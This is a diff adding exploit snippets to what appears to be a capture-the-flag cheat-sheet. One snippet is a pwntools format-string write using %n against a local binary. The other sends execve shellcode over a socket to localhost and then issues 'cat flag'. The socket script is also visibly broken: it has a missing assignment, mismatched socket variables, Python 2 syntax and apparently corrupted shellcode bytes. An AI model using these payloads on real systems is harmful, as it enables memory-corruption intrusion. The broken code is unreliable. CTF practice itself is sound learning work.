@@ -41,6 +41,71 @@ socket.addEventListener("close", (event) => {
 });
 ```
 
+### pwntools
+
+```python
+#!/usr/bin/python3.7
+
+from pwn import *
+context.binary = exe = ELF('./Level04')
+p = process(exe.path)
+
+p.recvuntil(b'check at ')
+address = p.recvline()
+address = address.decode('utf8').strip()
+# address = address.replace('0x', '')
+address=int(address, 16)
+
+payload = p32(address)
+payload += p32(address+1)
+payload += p32(address+2)
+payload += p32(address+3)
+payload += f'%89x'.encode()
+# payload = address
+payload += f'%5$n'.encode()
+payload += f'%6$n'.encode()
+payload += f'%7$n'.encode()
+payload += f'%8$n'.encode()
+# p.sendline(str(payload).encode())
+p.sendline((payload))
+# p.sendline(str(data).encode())
+
+p.interactive()
+```
+
+### socket
+
+```python
+import socket
+import re
+
+shellcode = "\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x2f\x73\x66\x68\x2F\x62\x69\x6E\x69\xe3\x52\x69\xe2\x53\x69\xe1\xcd\x80"
+HOST = 'localhost'
+PORT 10003
+a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((HOST, PORT))
+
+data = s.recv(102400)
+data = s.recv(102400)
+data = s.recv(102400)
+#Lay dia chi chuoi nhap vao
+string_addr = data [8:8+8]
+# Chuyen chuoi sang so
+string_addr = int(string_addr, 16)
+# Tinh dia chi shellcode
+string_addr += 16 + 4
+# Gui ma khai thac
+a.send("A"*16+ format (string_addr, 'x').decode("hex") [::-1] + shellcode + "\n")
+a.recv(102400)
+# Gui lenh cat flag
+s.send("cat flag\n")
+# Lay flag
+print s.recv (102400)
+print s.recv (102400)
+
+s.close()
+```
+
 ## http request
 
 ### Python
